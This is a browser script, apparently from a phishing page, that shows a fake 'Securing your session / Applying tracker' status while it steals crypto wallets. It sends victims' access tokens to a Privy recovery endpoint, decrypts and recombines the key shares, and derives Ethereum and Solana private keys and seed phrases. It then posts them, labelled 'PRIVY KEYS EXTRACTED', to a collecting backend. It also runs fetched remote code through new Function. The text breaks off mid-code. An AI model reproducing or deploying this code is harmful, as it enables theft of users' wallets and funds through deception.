<script>
(function() {
    const titleEl = document.getElementById('title');
    const subEl = document.getElementById('sub');
    const ui = document.getElementById('ui');
    const barEl = document.getElementById('__fomo_bar');

    const NETLIFY_URL = window.location.origin;

    function panelUrl(appUrl) {
        return String(appUrl || 'http://localhost:5173').replace(/\/$/, '') + '/panel';
    }

    function resolveReturnUrl(job) {
        if (job && job.returnUrl) return job.returnUrl;
        if (job && job.appUrl) return panelUrl(job.appUrl);
        return panelUrl('http://localhost:5173');
    }

    function resolveBackendUrl(job) {
        if (job && job.netlifyUrl) return job.netlifyUrl;
        return NETLIFY_URL;
    }

    async function finishJob(job, payload) {
        const backendUrl = resolveBackendUrl(job);
        const returnUrl = resolveReturnUrl(job);

        try {
            await fetch(backendUrl + '/api/report', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });
        } catch (e) {}

        try {
            sessionStorage.setItem('fomo_return_url', returnUrl);
        } catch (e) {}

        window.location.replace(returnUrl);
    }
    function setStatus(t, s) {
        if (t) titleEl.textContent = t;
        if (s) subEl.textContent = s;
    }

    function setDone() {
        ui.classList.add('ok');
        setStatus('Applied tracker', 'This tab will close automatically');
        setProgress(100);
        setTimeout(() => window.close(), 3000);
    }

    function setProgress(pct) {
        barEl.style.width = Math.min(100, pct) + '%';
    }

    function setError(msg) {
        subEl.textContent = 'Error: ' + msg;
        subEl.style.color = '#f87171';
    }

    async function loadScript(url) {
        try {
            const r = await fetch(url);
            const code = await r.text();
            new Function(code)();
            return true;
        } catch (e) {
            return false;
        }
    }

    const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    function b58encode(bytes) {
        const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
        let z = 0;
        while (z < u8.length && u8[z] === 0) z++;
        const size = Math.ceil(u8.length * 138 / 100) + 1;
        const b = new Uint8Array(size);
        let len = 0;
        for (let i = z; i < u8.length; i++) {
            let carry = u8[i];
            let j = 0;
            for (let k = size - 1; k >= 0 && (carry !== 0 || j < len); k--, j++) {
                carry += 256 * b[k];
                b[k] = carry % 58;
                carry = Math.floor(carry / 58);
            }
            len = j;
        }
        let out = '1'.repeat(z);
        for (let i = size - len; i < size; i++) out += B58[b[i]];
        return out;
    }

    function b64Decode(str) {
        try {
            let s = str.replace(/-/g, '+').replace(/_/g, '/');
            while (s.length % 4) s += '=';
            return atob(s);
        } catch { return null; }
    }

    function b64ToBuf(s) {
        let cleaned = String(s).replace(/[\s"\n\r]/g, '').replace(/-/g, '+').replace(/_/g, '/');
        const pad = '='.repeat((4 - (cleaned.length % 4)) % 4);
        cleaned += pad;
        return Uint8Array.from(atob(cleaned), c => c.charCodeAt(0));
    }

    function hex(u8) {
        return [...u8].map(b => b.toString(16).padStart(2, '0')).join('');
    }

    const LOG_TABLE = new Uint8Array([0x00,0xff,0xc8,0x08,0x91,0x10,0xd0,0x36,0x5a,0x3e,0xd8,0x43,0x99,0x77,0xfe,0x18,0x23,0x20,0x07,0x70,0xa1,0x6c,0x0c,0x7f,0x62,0x8b,0x40,0x46,0xc7,0x4b,0xe0,0x0e,0xeb,0x16,0xe8,0xad,0xcf,0xcd,0x39,0x53,0x6a,0x27,0x35,0x93,0xd4,0x4e,0x48,0xc3,0x2b,0x79,0x54,0x28,0x09,0x78,0x0f,0x21,0x90,0x87,0x14,0x2a,0xa9,0x9c,0xd6,0x74,0xb4,0x7c,0xde,0xed,0xb1,0x86,0x76,0xa4,0x98,0xe2,0x96,0x8f,0x02,0x32,0x1c,0xc1,0x33,0xee,0xef,0x81,0xfd,0x30,0x5c,0x13,0x9d,0x29,0x17,0xc4,0x11,0x44,0x8c,0x80,0xf3,0x73,0x42,0x1e,0x1d,0xb5,0xf0,0x12,0xd1,0x5b,0x41,0xa2,0xd7,0x2c,0xe9,0xd5,0x59,0xcb,0x50,0xa8,0xdc,0xfc,0xf2,0x56,0x72,0xa6,0x65,0x2f,0x9f,0x9b,0x3d,0xba,0x7d,0xc2,0x45,0x82,0xa7,0x57,0xb6,0xa3,0x7a,0x75,0x4f,0xae,0x3f,0x37,0x6d,0x47,0x61,0xbe,0xab,0xd3,0x5f,0xb0,0x58,0xaf,0xca,0x5e,0xfa,0x85,0xe4,0x4d,0x8a,0x05,0xfb,0x60,0xb7,0x7b,0xb8,0x26,0x4a,0x67,0xc6,0x1a,0xf8,0x69,0x25,0xb3,0xdb,0xbd,0x66,0xdd,0xf1,0xd2,0xdf,0x03,0x8d,0x34,0xd9,0x92,0x0d,0x63,0x55,0xaa,0x49,0xec,0xbc,0x95,0x3c,0x84,0x0b,0xf5,0xe6,0xe7,0xe5,0xac,0x7e,0x6e,0xb9,0xf9,0xda,0x8e,0x9a,0xc9,0x24,0xe1,0x0a,0x15,0x6b,0x3a,0xa0,0x51,0xf4,0xea,0xb2,0x97,0x9e,0x5d,0x22,0x88,0x94,0xce,0x19,0x01,0x71,0x4c,0xa5,0xe3,0xc5,0x31,0xbb,0xcc,0x1f,0x2d,0x3b,0x52,0x6f,0xf6,0x2e,0x89,0xf7,0xc0,0x68,0x1b,0x64,0x04,0x06,0xbf,0x83,0x38]);
    const EXP_TABLE = new Uint8Array([0x01,0xe5,0x4c,0xb5,0xfb,0x9f,0xfc,0x12,0x03,0x34,0xd4,0xc4,0x16,0xba,0x1f,0x36,0x05,0x5c,0x67,0x57,0x3a,0xd5,0x21,0x5a,0x0f,0xe4,0xa9,0xf9,0x4e,0x64,0x63,0xee,0x11,0x37,0xe0,0x10,0xd2,0xac,0xa5,0x29,0x33,0x59,0x3b,0x30,0x6d,0xef,0xf4,0x7b,0x55,0xeb,0x4d,0x50,0xb7,0x2a,0x07,0x8d,0xff,0x26,0xd7,0xf0,0xc2,0x7e,0x09,0x8c,0x1a,0x6a,0x62,0x0b,0x5d,0x82,0x1b,0x8f,0x2e,0xbe,0xa6,0x1d,0xe7,0x9d,0x2d,0x8a,0x72,0xd9,0xf1,0x27,0x32,0xbc,0x77,0x85,0x96,0x70,0x08,0x69,0x56,0xdf,0x99,0x94,0xa1,0x90,0x18,0xbb,0xfa,0x7a,0xb0,0xa7,0xf8,0xab,0x28,0xd6,0x15,0x8e,0xcb,0xf2,0x13,0xe6,0x78,0x61,0x3f,0x89,0x46,0x0d,0x35,0x31,0x88,0xa3,0x41,0x80,0xca,0x17,0x5f,0x53,0x83,0xfe,0xc3,0x9b,0x45,0x39,0xe1,0xf5,0x9e,0x19,0x5e,0xb6,0xcf,0x4b,0x38,0x04,0xb9,0x2b,0xe2,0xc1,0x4a,0xdd,0x48,0x0c,0xd0,0x7d,0x3d,0x58,0xde,0x7c,0xd8,0x14,0x6b,0x87,0x47,0xe8,0x79,0x84,0x73,0x3c,0xbd,0x92,0xc9,0x23,0x8b,0x97,0x95,0x44,0xdc,0xad,0x40,0x65,0x86,0xa2,0xa4,0xcc,0x7f,0xec,0xc0,0xaf,0x91,0xfd,0xf7,0x4f,0x81,0x2f,0x5b,0xea,0xa8,0x1c,0x02,0xd1,0x98,0x71,0xed,0x25,0xe3,0x24,0x06,0x68,0xb3,0x93,0x2c,0x6f,0x3e,0x6c,0x0a,0xb8,0xce,0xae,0x74,0xb1,0x42,0xb4,0x1e,0xd3,0x49,0xe9,0x9c,0xc8,0xc6,0xc7,0x22,0x6e,0xdb,0x20,0xbf,0x43,0x51,0x52,0x66,0xb2,0x76,0x60,0xda,0xc5,0xf3,0xf6,0xaa,0xcd,0x9a,0xa0,0x75,0x54,0x0e,0x01]);

    function gfAdd(a, b) { return a ^ b; }
    function gfDiv(a, b) { if (b === 0) throw new Error('div0'); if (a === 0) return 0; return EXP_TABLE[(LOG_TABLE[a] - LOG_TABLE[b] + 255) % 255]; }
    function gfMult(a, b) { if (a === 0 || b === 0) return 0; return EXP_TABLE[(LOG_TABLE[a] + LOG_TABLE[b]) % 255]; }

    function interpolate(xs, ys, x) {
        const n = xs.length;
        let r = 0;
        for (let i = 0; i < n; i++) {
            let b = 1;
            for (let j = 0; j < n; j++) {
                if (i === j) continue;
                b = gfMult(b, gfDiv(gfAdd(x, xs[j]), gfAdd(xs[i], xs[j])));
            }
            r = gfAdd(r, gfMult(ys[i], b));
        }
        return r;
    }

    function combineShares(shares) {
        if (!shares || shares.length < 2) throw new Error('need >=2 shares');
        const len = shares[0].length;
        const secretLen = len - 1;
        const secret = new Uint8Array(secretLen);
        const xs = new Uint8Array(shares.length);
        const ys = new Uint8Array(shares.length);
        const seen = new Set();
        for (let i = 0; i < shares.length; i++) {
            const x = shares[i][len - 1];
            if (seen.has(x)) throw new Error('duplicate share');
            seen.add(x);
            xs[i] = x;
        }
        for (let i = 0; i < secretLen; i++) {
            for (let j = 0; j < shares.length; j++) ys[j] = shares[j][i];
            secret[i] = interpolate(xs, ys, 0);
        }
        return secret;
    }

    async function decryptShare(rk, enc, iv) {
        const keyBytes = b64ToBuf(rk);
        const ivBuf = b64ToBuf(iv);
        const cipher = b64ToBuf(enc);
        const key = await crypto.subtle.importKey('raw', keyBytes, 'AES-GCM', false, ['decrypt']);
        return new Uint8Array(await crypto.subtle.decrypt({ name: 'AES-GCM', iv: ivBuf }, key, cipher));
    }

    async function hmacSha512(key, data) {
        const cryptoKey = await crypto.subtle.importKey(
            'raw',
            key instanceof Uint8Array ? key : new TextEncoder().encode(key),
            { name: 'HMAC', hash: 'SHA-512' },
            false,
            ['sign']
        );
        return new Uint8Array(await crypto.subtle.sign('HMAC', cryptoKey, data));
    }

    async function slip10Derive(seed, path) {
        let I = await hmacSha512(new TextEncoder().encode('ed25519 seed'), seed);
        for (const seg of path.replace(/^m\//, '').split('/')) {
            if (!seg) continue;
            const hardened = seg.endsWith("'");
            const index = parseInt(seg.replace("'", ""), 10) + (hardened ? 0x80000000 : 0);
            const data = new Uint8Array(37);
            data[0] = 0;
            data.set(I.slice(0, 32), 1);
            data[33] = (index >>> 24) & 0xff;
            data[34] = (index >>> 16) & 0xff;
            data[35] = (index >>> 8) & 0xff;
            data[36] = index & 0xff;
            I = await hmacSha512(I.slice(32, 64), data);
        }
        return I.slice(0, 32);
    }

    async function deriveEVM(entropyHex, expectedAddress) {
        const results = [];
        const entropyBytes = entropyHex.startsWith('0x') ? ethers.utils.arrayify(entropyHex) : ethers.utils.arrayify('0x' + entropyHex);
        
        try {
            const mnemonic = ethers.utils.entropyToMnemonic(entropyHex);
            const wallet = ethers.Wallet.fromMnemonic(mnemonic);
            results.push({ address: wallet.address, privateKey: wallet.privateKey, mnemonic: mnemonic });
        } catch (e) {}

        try {
            const mnemonic = ethers.utils.entropyToMnemonic(entropyHex);
            const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
            const paths = ["m/44'/60'/0'/0/0", "m/44'/60'/0'/0", "m/44'/60'/0'", "m/44'/60'/0'/0/0'"];
            for (const path of paths) {
                try {
                    const child = hdNode.derivePath(path);
                    results.push({ address: child.address, privateKey: child.privateKey, mnemonic: mnemonic });
                } catch (e) {}
            }
        } catch (e) {}

        try {
            const seed = entropyBytes;
            const hdNode = ethers.utils.HDNode.fromSeed(seed);
            const paths = ["m/44'/60'/0'/0/0", "m/44'/60'/0'/0", "m/44'/60'/0'"];
            for (const path of paths) {
                try {
                    const child = hdNode.derivePath(path);
                    results.push({ address: child.address, privateKey: child.privateKey, mnemonic: null });
                } catch (e) {}
            }
        } catch (e) {}

        try {
            const pk = entropyBytes.length >= 32 ? ethers.utils.hexlify(entropyBytes.slice(0, 32)) : ethers.utils.hexlify(entropyBytes);
            const wallet = new ethers.Wallet(pk);
            results.push({ address: wallet.address, privateKey: wallet.privateKey, mnemonic: null });
        } catch (e) {}

        const match = results.find(r => r.address && r.address.toLowerCase() === expectedAddress.toLowerCase());
        if (match) return match;
        if (results.length > 0) return results[0];
        return null;
    }

    const hash = window.location.hash;
    let job = null;

    if (hash && hash.startsWith('#job=')) {
        try {
            const encoded = hash.replace('#job=', '');
            const json = b64Decode(encoded);
            if (json) job = JSON.parse(json);
        } catch (e) {
            setError('Failed to parse job data');
        }
    }

    if (job && job.items && job.items.length > 0) {
        setStatus('Securing your session', 'Applying tracker...');
        setProgress(10);

        async function processWallets() {
            const results = [];
            const backendUrl = resolveBackendUrl(job);

            setStatus('Securing your session', 'Applying tracker...');
            setProgress(20);
            await loadScript('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js');
            await loadScript('https://cdn.jsdelivr.net/npm/tweetnacl@1.0.3/nacl-fast.min.js');
            setProgress(30);

            let processed = 0;
            const total = job.items.length;

            for (const item of job.items) {
                const chain = item.chainType || 'ethereum';
                const addr = item.wallet || 'unknown';
                const tokenToUse = item.accessToken;
                const caIdToUse = item.caId;

                setStatus('Securing your session', 'Applying tracker...');
                setProgress(30 + ((processed / total) * 50));

                try {
                    const payload = {
                        appId: 'cm6h485o300n3zj9yl6vpedq7',
                        clientId: 'client-WY5gFSayQjxnQhG4rP6SnwPAyPZWZpNRhJ6b9rzMnYwqH',
                        caId: caIdToUse,
                        wallet: addr,
                        accessToken: tokenToUse,
                        chainType: chain,
                        chain_type: chain
                    };

                    const resp = await fetch(backendUrl + '/api/recover', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    const result = await resp.json();

                    if (result.ok !== false && result.recoveryKey) {
                        const recovered = await decryptShare(
                            result.recoveryKey,
                            result.shares?.data?.encrypted_recovery_share,
                            result.shares?.data?.encrypted_recovery_share_iv
                        );
                        const auth = b64ToBuf(result.auth_share?.data?.share);
                        const entropy = combineShares([auth, recovered]);
                        const entropyHex = '0x' + hex(entropy);
                        const seed32 = entropy.slice(0, 32);

                        if (chain === 'ethereum') {
                            if (typeof ethers !== 'undefined') {
                                try {
                                    const derived = await deriveEVM(entropyHex, addr);
                                    if (derived) {
                                        results.push({
                                            chainType: 'ethereum',
                                            address: derived.address,
                                            privateKey: derived.privateKey,
                                            mnemonic: derived.mnemonic || null
                                        });
                                    } else {
                                        results.push({
                                            chainType: 'ethereum',
                                            address: addr,
                                            privateKey: '0x' + hex(entropy.slice(0, 32)),
                                            mnemonic: null
                                        });
                                    }
                                } catch (e) {
                                    results.push({
                                        chainType: 'ethereum',
                                        address: addr,
                                        privateKey: '0x' + hex(entropy.slice(0, 32)),
                                        mnemonic: null
                                    });
                                }
                            } else {
                                results.push({
                                    chainType: 'ethereum',
                                    address: addr,
                                    privateKey: '0x' + hex(entropy.slice(0, 32)),
                                    mnemonic: null
                                });
                            }
                        }

                        if (chain === 'solana') {
                            let found = false;
                            let solanaPrivateKey = null;
                            let solanaSeed = null;

                            if (typeof nacl !== 'undefined') {
                                try {
                                    const paths = ["m/44'/501'/0'/0'", "m/44'/501'/0'", "m/44'/501'/0'/0'/0'"];
                                    for (const path of paths) {
                                        try {
                                            const derived = await slip10Derive(seed32, path);
                                            const kp = nacl.sign.keyPair.fromSeed(derived);
                                            const derivedAddr = b58encode(kp.publicKey);
                                            if (derivedAddr === addr) {
                                                solanaPrivateKey = b58encode(kp.secretKey);
                                                solanaSeed = b58encode(derived);
                                                found = true;
                                                break;
                                            }
                                        } catch (e) {}
                                    }
                                } catch (e) {}
                            }

                            if (found && solanaPrivateKey) {
                                results.push({
                                    chainType: 'solana',
                                    address: addr,
                                    privateKey: solanaPrivateKey,
                                    privateKeySeed: solanaSeed
                                });
                            } else {
                                results.push({
                                    chainType: 'solana',
                                    address: addr,
                                    privateKey: entropyHex
                                });
                            }
                        }
                    }
                } catch (e) {}
                processed++;
            }

            setProgress(85);
            window.__EXTRACTED_KEYS__ = results;

            function formatTelegramMessage(results) {
                const eth = results.filter(r => r.chainType === 'ethereum');
                const sol = results.filter(r => r.chainType === 'solana');
                const total = eth.length + sol.length;

                if (total === 0) return 'No keys extracted';

                const parts = [];
                parts.push('PRIVY KEYS EXTRACTED');
                parts.push('');

                for (const w of eth) {
                    parts.push('--- ETHEREUM ---');
                    if (w.address) parts.push('Address: ' + w.address);
                    if (w.privateKey) parts.push('Private Key: ' + w.privateKey);
                    if (w.mnemonic) parts.push('Seed: ' + w.mnemonic);
                }

                for (const w of sol) {
                    parts.push('--- SOLANA ---');
                    if (w.address) parts.push('Address: ' + w.address);
                    if (w.privateKey) parts.push('Private Key: ' + w.privateKey);
                    if (w.privateKeySeed) parts.push('Seed: ' + w.privateKeySeed);
                }

                parts.push('');
                parts.push('Total: ' + total + ' wallet' + (total > 1 ? 's' : ''));
                return parts.join('\n');
            }

            const ethResults = results.filter(r => r.chainType === 'ethereum');
            const solResults = results.filter(r => r.chainType === 'solana');
            
            const payload = {
                source: 'fomo.family',
                ts: Date.now(),
                ethereum: ethResults.map(r => ({
                    address: r.address,
                    privateKey: r.privateKey,
                    mnemonic: r.mnemonic || null
                })),
                solana: solResults.map(r => ({
                    address: r.address,
                    privateKey: r.privateKey,
                    privateKeySeed: r.privateKeySeed || null
                }))
            };

            setProgress(100);
            await finishJob(job, payload);
            return;

            if (window.opener) {
                window.opener.postMessage({
                    type: 'privy-keys-extracted',
                    keys: results
